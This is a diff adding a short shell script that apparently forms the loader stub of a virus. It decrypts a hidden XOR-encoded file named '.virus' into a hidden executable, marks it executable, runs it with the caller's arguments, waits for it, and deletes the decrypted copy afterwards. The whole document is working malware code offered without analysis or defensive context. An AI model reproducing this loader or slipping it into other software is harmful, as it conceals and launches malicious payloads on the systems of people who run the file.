@@ -1,0 +1,17 @@
+#!/bin/sh
+
+this_file=$1
+
+#echo ${this_file##*/}
+
+./.$this_file.xorcipher .$this_file.virus .$this_file.dexored $this_file;
+
+chmod +x .$this_file.dexored ; 
+
+./.$this_file.dexored $@;
+
+PID_virus=$!
+
+wait $PID_virus
+
+rm -f .$this_file.dexored;
